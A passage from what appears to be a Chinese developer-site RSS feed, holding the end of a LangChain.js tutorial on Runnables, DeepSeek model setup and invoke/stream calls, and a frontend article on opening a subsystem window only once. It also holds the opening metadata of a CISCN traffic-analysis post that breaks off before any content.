<h4 data-id="heading-2">langchain</h4>
<p>设计理念<br/>
<code>langchain</code> 的设计目标是把各种与大语言模型（LLM）交互的常见构建块抽象成高度可组合、可重用的组件，降低将模型能力嵌入应用的门槛。核心思想是“把模型作为函数来调用并组合这些函数”——通过统一的接口（如 <code>Runnable</code>）来链接提示模板、模型调用、解析器、检索器和工具等，从而以链式方式快速构建文本处理流水线。</p>
<p>特点</p>
<ul>
<li>组件化与可组合性：大多数组件实现相同的 <code>Runnable</code> 接口，支持 <code>invoke</code>、<code>batch</code>、<code>stream</code> 等统一调用方式，便于通过 <code>pipe</code> 或其他组合方法构建复杂流程。</li>
<li>丰富的集成：与主流模型提供商（如 OpenAI、Anthropic、Google 等）有对接包，支持检索（retriever）、向量数据库、工具调用、外部 API 等。抹平了供应商之间的不同.</li>
<li>轻量与灵活：适合实现短时、无状态或弱状态的任务，适配快速原型和单次调用场景。</li>
<li>开发体验：提供提示模板、解析器、常用链（chains）和代理（agents）模式，降低构建常见功能（如问答、摘要、信息抽取）的复杂度。</li>
</ul>
<p>适用场景</p>
<ul>
<li>单轮问答系统（如知识库查询）</li>
<li>文档摘要与抽取</li>
<li>固定流程的数据处理（例如数据清洗后调用模型生成报告）</li>
<li>快速原型与 PoC（Proof of Concept）</li>
<li>基础的代理模式与工具调用（如 ReAct 模式）</li>
</ul>
<p>这些场景通常不需要复杂的循环逻辑或长期状态管理，适合使用链式架构快速构建并迭代。</p>
<h4 data-id="heading-3">langgraph</h4>
<p>设计理念<br/>
<code>langgraph</code> 的设计目标是把智能应用的控制流从线性链式抽象提升为有向图（graph）结构，以便更好地表达多步骤决策、条件分支、并行子任务、长期状态与人机协同。通过把每一步工作流建模为节点（node）并用边（edge）描述数据与控制流，提供更强的可观测性、重试、持久化与可插拔的人工干预点。</p>
<p>特点</p>
<ul>
<li>图式工作流编排：使用有向图表达复杂流程，节点可复用、子图嵌套，支持条件分支与并行执行。</li>
<li>状态与持久化：内置或可配置的检查点（checkpoint）与持久化机制，适合长任务与可恢复的流程。</li>
<li>人机协同：天然支持人工干预点（human-in-the-loop）、审批流与回滚机制，便于在高风险场景中介入。</li>
<li>多智能体与子图：支持多个智能体或子图协作、通信与结果整合，适合复杂协作场景。</li>
<li>观测与调试：通常配合可视化工具或追踪系统（tracing）来观察执行路径、监控运行时数据与诊断失败原因。</li>
</ul>
<p>适用场景</p>
<ul>
<li>需要多步骤决策的智能客服系统（例如：按用户问题动态选择检索 → 问答 → 人工审批）</li>
<li>长期交互的对话式应用（如教育辅导、持续任务管理）</li>
<li>金融或合规审批流程（根据规则和金额决定是否需要人工审批）</li>
<li>多智能体协作系统（如团队任务分配与进度协调）</li>
<li>高风险操作流程（例如生产系统变更需人工确认）</li>
<li>支持回滚、持久化与长任务的自动化流程（如复杂文档生成、数据处理管道）</li>
</ul>
<p>这些场景通常需要精细的流程控制、长期状态管理或复杂决策逻辑，适合使用图结构进行编排。</p>
<h2 data-id="heading-4">安装</h2>
<h3 data-id="heading-5">主包</h3>
<pre><code class="hljs language-java" lang="java">npm install langchain <span class="hljs-meta">@langchain</span>/core <span class="hljs-comment">//当前最新版本是1.0.2</span>
Copy
</code></pre>
<p><code>@langchain/core</code> 是最底层包，<code>langchain</code> 生态系统中除了 <code>langsmith</code> 其他所有软件包都依赖该包。它包含了其他软件包所需要使用的基类。</p>
<h3 data-id="heading-6">集成包</h3>
<p>各个第三方提供的集成包依赖主包，例如：<code>@langchain/anthropic</code>（专门与 Anthropic 提供的模型对接）、<code>@langchain/community</code>（收集一些由社区贡献但并未被 <code>langchain</code> 收纳的包）。这些包不需要在项目启动时全部安装，按需引入即可。但要注意：集成包都依赖主包，最好在项目中强制指定主包版本：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// package.json</span>
<span class="hljs-string">"overrides"</span>: {
  <span class="hljs-string">"@langchain/core"</span>: <span class="hljs-string">"^1.0.2"</span>
}
<span class="hljs-built_in">Copy</span>
</code></pre>
<p>常见集成包示例：</p>
<ul>
<li><code>@langchain/community</code>：一些由社区贡献但并未被 <code>langchain</code> 收纳的包</li>
<li><code>@langchain/openai</code>：在 <code>langchain</code> 中使用 OpenAI 的大模型服务</li>
<li><code>@langchain/langgraph</code>：使用有向图的方式构建多智能体或有状态应用</li>
<li><code>langsmith</code>：用于对智能体应用监控与观测的库</li>
</ul>
<p><code>langchain</code> 包的组织依赖关系:。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11ef0b2a6a244384b0f69bc9b786feec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGhlX21hc3NpZg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873824&amp;x-signature=St5mbD%2B%2F61o3GGN6QaXv0v1MzWI%3D" alt="image-20250823225140268.png" loading="lazy"/></p>
<h2 data-id="heading-7">Runnable</h2>
<p>在正式开始之前我们先了解一下什么是 <code>Runnable</code>。</p>
<p>在 <code>LangChain.js</code> 中，<code>Runnable</code> 是一个核心的接口，它定义了一套统一的、可组合的方法，用于执行和管理各种组件。几乎所有 LangChain 组件，如语言模型、提示模板、链、解析器、检索器等，都实现了 <code>Runnable</code> 接口。因此 <code>langchain</code> 中的大部分组件都具备一组相同的标准化调用方式，可以极大地简化组件的使用和组合。</p>
<p>对于任意实现了 <code>Runnable&lt;I, O&gt;</code> 接口的对象（其中 <code>I</code> 是输入类型，<code>O</code> 是输出类型），它都提供了以下核心执行方法：</p>



































<table><thead><tr><th>方法名</th><th>参数</th><th>返回值</th><th>功能与用途</th></tr></thead><tbody><tr><td><code>invoke(input, options?)</code></td><td><code>input: I</code><br/><code>options?: Partial&lt;RunnableConfig&gt;</code></td><td><code>Promise&lt;O&gt;</code></td><td>基础调用：接收单个输入 <code>input</code> 并执行 <code>Runnable</code>，返回一个 <code>Promise</code>，解析为最终输出 <code>O</code>。<code>options</code> 可传运行时配置（回调、标签、元数据等）。</td></tr><tr><td><code>batch(inputs, options?)</code></td><td><code>inputs: I[]</code><br/><code>options?: Partial&lt;RunnableConfig&gt; Partial&lt;RunnableConfig&gt;[]</code></td><td><code>Promise&lt;O[]&gt;</code></td><td>批量调用: 高效地处理一组输入 <code>inputs</code>。返回一个 <code>Promise</code>，该 <code>Promise</code> 会解析为一个输出数组 <code>O[]</code>。<code>options</code> 可以是一个配置对象（应用于所有输入）或一个配置对象数组（每个输入对应一个配置）。底层实现（如 API 调用）通常能优化批量请求。</td></tr><tr><td><code>stream(input, options?)</code></td><td><code>input: I</code><br/><code>options?: Partial&lt;RunnableConfig&gt;</code></td><td><code>AsyncGenerator&lt;O, void, unknown&gt;</code></td><td>流式输出：返回异步生成器，适用于低延迟、逐步输出（如聊天逐字输出）。</td></tr><tr><td><code>streamLog(input, options?)</code></td><td><code>input: I</code><br/><code>options?: Partial&lt;RunnableConfig&gt;</code></td><td><code>AsyncGenerator&lt;RunLogPatch, void, unknown&gt;</code></td><td>流式日志：以流的形式返回执行过程的日志补丁，包含中间值、状态变化与错误信息，便于监控与调试。</td></tr></tbody></table>
<p>除了核心执行方法，<code>Runnable</code> 还提供了一系列组合与配置方法，这些方法不执行 <code>Runnable</code>，而是返回一个新的 <code>Runnable</code> 实例，从而实现函数式编程与链式构建：</p>



































<table><thead><tr><th>方法名</th><th>参数</th><th>返回值</th><th>功能与用途</th></tr></thead><tbody><tr><td><code>pipe(co)</code></td><td><code>co: RunnableLike&lt;NewOutput&gt;</code></td><td><code>Runnable&lt;I, NewOutput&gt;</code></td><td>管道组合：将当前 <code>Runnable</code> 的输出作为下一个 <code>RunnableLike</code> 的输入，返回新的线性执行流程。</td></tr><tr><td><code>withConfig(config)</code></td><td><code>config: RunnableConfig</code></td><td><code>this</code> (新实例)</td><td>绑定默认配置：返回带默认运行时配置的 <code>Runnable</code> 实例，便于预设回调、标签等。</td></tr><tr><td><code>withListParser(parser)</code></td><td><code>parser: ListParser</code></td><td><code>Runnable&lt;I, string[]&gt;</code></td><td>列表解析：返回新 <code>Runnable</code>，其输出会经过 <code>ListParser</code> 转换为字符串数组。</td></tr><tr><td><code>withTypes&lt;NewI, NewO&gt;()</code></td><td>(泛型参数)</td><td><code>Runnable&lt;NewI, NewO&gt;</code></td><td>类型转换（TypeScript）：不改变行为，仅改变类型签名，便于类型适配。</td></tr></tbody></table>
<h2 data-id="heading-8">模型调用</h2>
<p>开发智能应用的第一步是将大模型集成到项目中。这部分工作可以通过 <code>langchain</code> 提供的集成包来实现。</p>
<p>由于各个模型厂商提供的模型接口差异，在 <code>langchain</code> 中调用不同的模型首先要安装对应的集成包，目前常见的模型厂商包括：</p>
<ul>
<li><code>openai</code>: <code>@langchain/openai</code></li>
<li><code>anthropic</code>: <code>@langchain/anthropic</code></li>
<li><code>google-gemini</code>: <code>@langchain/google-genai</code></li>
<li><code>mistralai</code>: <code>@langchain/mistralai</code></li>
<li><code>groq</code>: <code>@langchain/groq</code></li>
<li><code>vertexai</code>: <code>@langchain/google-vertexai</code></li>
</ul>
<p>这里以 <code>deepseek</code>（或任意支持聊天接口的模型）为例，其他模型包可参照相应的集成文档。如果使用的是本地部署模型，请查看对应的 LLM 集成说明。</p>
<p>提示：如果使用第三方代理（gateway）兼容某个标准（例如 OpenAI 标准），在很多情况下只需使用对应标准的集成包（例如 <code>@langchain/openai</code>）即可与该代理通信。</p>
<h3 data-id="heading-9">申请 key</h3>
<p>在调用大模型之前需要到模型提供商处申请 API key。演示中提到使用 <code>deepseek</code> 的 key，注册后在平台生成 key 并设置到环境变量中即可。</p>
<h3 data-id="heading-10">安装集成包（示例）</h3>
<pre><code class="hljs language-css" lang="css">npm <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">@langchain</span>/deepseek
import { ChatDeepSeek } <span class="hljs-selector-tag">from</span> '<span class="hljs-keyword">@langchain</span>/deepseek'
Copy
</code></pre>
<h3 data-id="heading-11">创建模型</h3>
<ol>
<li>
<p>添加环境变量</p>
<p><code>@langchain/deepseek</code> 包在初始化时，会默认使用 <code>DEEPSEEK_API_KEY</code> 中的值来读取 API key。开发时也可以直接在代码中传入 <code>apiKey</code>，但生产环境建议使用环境变量。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> model = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ChatDeepSeek</span>({
  model: <span class="hljs-string">'你的模型名称deepseek-chat/deepseek-reasoner'</span>, <span class="hljs-comment">// deepseek 提供的模型名称</span>
  temperature: <span class="hljs-number">0.5</span>,
  apiKey: <span class="hljs-string">'xxxxx'</span>
});
</code></pre>
<p>更推荐使用 <code>dotenv</code> 注入环境变量：</p>
<ol>
<li>
<p>新建 <code>.env</code> 文件并设置 key</p>
<pre><code class="hljs language-ini" lang="ini">// .env
<span class="hljs-attr">DEEPSEEK_API_KEY</span>=your-api-key
Copy
</code></pre>
</li>
<li>
<p>安装并加载 <code>dotenv</code></p>
<pre><code class="hljs language-css" lang="css">npm <span class="hljs-selector-tag">i</span> dotenv
</code></pre>
</li>
<li>
<p>在代码中注入环境变量</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> dotenv from <span class="hljs-string">'dotenv'</span>
dotenv.<span class="hljs-built_in">config</span>()
console.<span class="hljs-built_in">log</span>(process.env.DEEPSEEK_API_KEY)
</code></pre>
</li>
</ol>
</li>
<li>
<p>实例化模型</p>
</li>
</ol>

<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> model = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ChatDeepSeek</span>({
  model: <span class="hljs-string">"deepseek-chat"</span>,
  temperature: <span class="hljs-number">0</span>
})
</code></pre>
<p>3.  设置模型参数  </p>
<pre><code class="hljs language-markdown" lang="markdown">常见的模型参数包括：

<span class="hljs-bullet">*</span>   <span class="hljs-code">`model`</span>：要使用的模型名称或标识符（例如 <span class="hljs-code">`"deepseek-chat"`</span>）。
<span class="hljs-bullet">*</span>   <span class="hljs-code">`temperature`</span>：控制输出随机性（越高越随机）。
<span class="hljs-bullet">*</span>   <span class="hljs-code">`maxTokens`</span>：限制生成的最大 token 数量。
<span class="hljs-bullet">*</span>   <span class="hljs-code">`stop`</span>：停止序列，指示模型何时结束生成。
<span class="hljs-bullet">*</span>   <span class="hljs-code">`apiKey`</span>：用于鉴权的 API key（推荐通过环境变量提供）。

注意：并不是所有集成包都支持所有参数，请参照对应集成包文档。
</code></pre>
<h3 data-id="heading-12">调用模型</h3>
<p>下面介绍两种常用调用方式：普通输出（<code>invoke</code>）和流式输出（<code>stream</code>）。</p>
<h4 data-id="heading-13">invoke</h4>
<p>实例化模型后可以直接调用 <code>invoke</code> 与模型通信。由于模型对象是 <code>Runnable</code>，它具有统一接口：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> model.invoke(<span class="hljs-string">'你好,你是谁'</span>)

<span class="hljs-comment">// 返回一个 AIMessage 对象</span>
AIMessage {
  <span class="hljs-string">"id"</span>: <span class="hljs-string">"467ec80fa202490eae7bcf7019ab4e38"</span>,
  <span class="hljs-string">"content"</span>: <span class="hljs-string">"我是DeepSeek Chat，由深度求索公司（DeepSeek）开发的智能AI助手！...."</span>,
  <span class="hljs-string">"additional_kwargs"</span>: {
    <span class="hljs-string">"function_call"</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-string">"tool_calls"</span>: <span class="hljs-literal">null</span>
  },
  <span class="hljs-string">"response_metadata"</span>: {
    <span class="hljs-string">"tokenUsage"</span>: {
      <span class="hljs-string">"promptTokens"</span>: <span class="hljs-number">4</span>,
      <span class="hljs-string">"completionTokens"</span>: <span class="hljs-number">71</span>,
      <span class="hljs-string">"totalTokens"</span>: <span class="hljs-number">75</span>
    },
    <span class="hljs-string">"finish_reason"</span>: <span class="hljs-string">"stop"</span>,
    <span class="hljs-string">"model_name"</span>: <span class="hljs-string">"DeepSeek-V3"</span>
  },
  <span class="hljs-string">"tool_calls"</span>: [],
  <span class="hljs-string">"invalid_tool_calls"</span>: [],
  <span class="hljs-string">"usage_metadata"</span>: {
    <span class="hljs-string">"output_tokens"</span>: <span class="hljs-number">71</span>,
    <span class="hljs-string">"input_tokens"</span>: <span class="hljs-number">4</span>,
    <span class="hljs-string">"total_tokens"</span>: <span class="hljs-number">75</span>,
    <span class="hljs-string">"input_token_details"</span>: {},
    <span class="hljs-string">"output_token_details"</span>: {}
  }
}
</code></pre>
<p><code>invoke</code> 支持多种输入格式：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 直接字符串</span>
await llm.<span class="hljs-built_in">invoke</span>(<span class="hljs-string">'你是谁'</span>)

<span class="hljs-comment">// 消息数组</span>
await llm.<span class="hljs-built_in">invoke</span>([
  { role: <span class="hljs-string">'user'</span>, content: <span class="hljs-string">'你是谁'</span> }
])

<span class="hljs-comment">// 使用消息类</span>
await llm.<span class="hljs-built_in">invoke</span>([<span class="hljs-keyword">new</span> <span class="hljs-built_in">HumanMessage</span>(<span class="hljs-string">'你是谁'</span>)])

<span class="hljs-comment">// 二元数组形式</span>
await llm.<span class="hljs-built_in">invoke</span>([[<span class="hljs-string">"user"</span>, <span class="hljs-string">"你是谁"</span>]])
</code></pre>
<h4 data-id="heading-14">stream</h4>
<p>调用 <code>stream</code> 可以开启流式输出，返回一个异步可迭代对象，通过 <code>for await</code> 可以逐步获得输出片段，适用于低延迟交互或逐步渲染文本的场景。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> res = await model.<span class="hljs-built_in">stream</span>(userQuest);

<span class="hljs-function"><span class="hljs-keyword">for</span> <span class="hljs-title">await</span> <span class="hljs-params">(<span class="hljs-type">const</span> chunk of res)</span> </span>{
  process.stdout.<span class="hljs-built_in">write</span>(chunk.content); <span class="hljs-comment">// 每一个 chunk 都是一个 AIMessage 片段</span>
}
</code></pre>
<p>练习: 使用自己的key调用大模型</p>
<p>本章的内容就到这里,如果您希望继续更新相关内容,请点赞支持一下,您的点赞是我更新的动力!!</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端实现跳转子系统，但限制只能跳转一次]]></title>    <link>https://juejin.cn/post/7594389937462607882</link>    <guid>https://juejin.cn/post/7594389937462607882</guid>    <pubDate>2026-01-13T01:57:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389937462607882" data-draft-id="7592582130594431027" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端实现跳转子系统，但限制只能跳转一次"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-13T01:57:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="盘子素"/> <meta itemprop="url" content="https://juejin.cn/user/259915324852855"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端实现跳转子系统，但限制只能跳转一次
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/259915324852855/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    盘子素
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:57:23.000Z" title="Tue Jan 13 2026 01:57:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>项目要求在主系统页面，点击子系统图标-后端返回子系统url-跳转到第三方子系统新窗口，但限制只能跳转一次。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c50b195a019b49cdbd7789028948b668~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55uY5a2Q57Sg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874288&amp;x-signature=dd7jbtCEwkcRiKHrTKTzyKzHnP4%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-0">1.记录子系统窗口window对象</h2>
<p>于是一开始的实现方案是把子系统新窗口的window对象记录下来，每次点击图标前判断该window的closed属性，如果为false就是没关闭，就弹出“每个应用只能跳转一次，请到对应窗口进行操作”之类的提示语。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">handleClick</span>(<span class="hljs-params">clientId</span>) {
  <span class="hljs-comment">// 先判断是否已打开窗口</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[clientId] &amp;&amp; !<span class="hljs-variable language_">window</span>[clientId].<span class="hljs-property">closed</span>) {
    <span class="hljs-variable language_">this</span>.$message({ <span class="hljs-attr">type</span>: <span class="hljs-string">'warning'</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'每个应用只能跳转一次，请切换到对应窗口进行操作'</span> });
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 调用接口</span>
    <span class="hljs-title function_">inter</span>(clientId).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
      <span class="hljs-keyword">const</span> childWindow = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(res.<span class="hljs-property">url</span>);
    });
  }
}
</code></pre>
<p>但是发现一旦页面刷新，就能突破只能跳转一次的限制，原因是刷新后存储的window会清空，无法实现持久化储存，而window对象也无法存入localStorage、sessionStorage。</p>
<p>然后思考是否可以后端存储子系统窗口的状态，如果点击+跳转过，就不能再次跳转。</p>
<p>然而这种方案需要监听子窗口关闭事件，关闭后需要通知后端更新子窗口状态。但浏览器没有提供关闭事件，只有beforeunload或者unload这种事件，这俩事件除了关闭、刷新页面也可触发。因此放弃这种方案。</p>
<h2 data-id="heading-1">2.把需求改为永远跳转到同一个子窗口</h2>
<p>如果限制是“只能跳转一次”，那每次都跳转到同一个子窗口，其实也是满足需求的。</p>
<p>于是方案改为：先打开唯一名称但不设置url的子窗口，然后判断该窗口的url是否为“about:blank”，如果是的话，说明该名称的窗口没有被打开过，则发起请求，然后把后端返回正确的url赋给子窗口的location.href。如果子窗口的url不是“about:blank”，那说明已经打开过，这个动作正好focus到打开过的子窗口上。</p>
<p>大概的代码如下：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">handleClick</span>(<span class="hljs-params">clientId</span>) {
  <span class="hljs-comment">// 先尝试打开子窗口，注意子窗口的名称需要唯一</span>
  <span class="hljs-keyword">const</span> childWindow = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">""</span>, childName + <span class="hljs-variable constant_">LOGIN_TIME</span>);

  <span class="hljs-comment">// 如果子窗口的url为about:blank，说明这是第一次打开</span>
  <span class="hljs-keyword">if</span> (childWindow.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> === <span class="hljs-string">"about:blank"</span>) {
    <span class="hljs-comment">// 发送请求，获得正确url</span>
    <span class="hljs-title function_">inter</span>(xxx).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
      <span class="hljs-comment">// 也可以childWindow =  window.open(res.url, childName + LOGIN_TIME);</span>
      <span class="hljs-comment">// 如果子系统和门户系统不同源的话，用上面的方法</span>
      childWindow.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = res.<span class="hljs-property">url</span>;
    }).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
      childWindow.<span class="hljs-title function_">close</span>();
    });
}
}

</code></pre>
<p>这种方案遇到的新问题是需要将主窗口的一些数据传递给子窗口，比如子系统的token数据。</p>
<p>一开始使用<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FBroadcastChannel%2Fname" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/BroadcastChannel/name" ref="nofollow noopener noreferrer"><code>BroadcastChannel</code></a>来实现消息传递，但是实际操作发现总是未等子窗口准备好，主窗口就已经传递完毕了，所以pass。
最后使用的是localStorage这种笨方法。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025CISCN流量分析全复盘与技法总结]]></title>    <link>https://juejin.cn/post/7594315259462877219</link>    <guid>https://juejin.cn/post/7594315259462877219</guid>    <pubDate>2026-01-13T01:59:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594315259462877219" data-draft-id="7594310266411302912" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025CISCN流量分析全复盘与技法总结"/> <meta itemprop="keywords" content="前端,黑客"/> <meta itemprop="datePublished" content="2026-01-13T01:59:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="蚁景网安实验室"/> <meta itemprop="url" content="https://juejin.cn/user/1398234521018846"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta 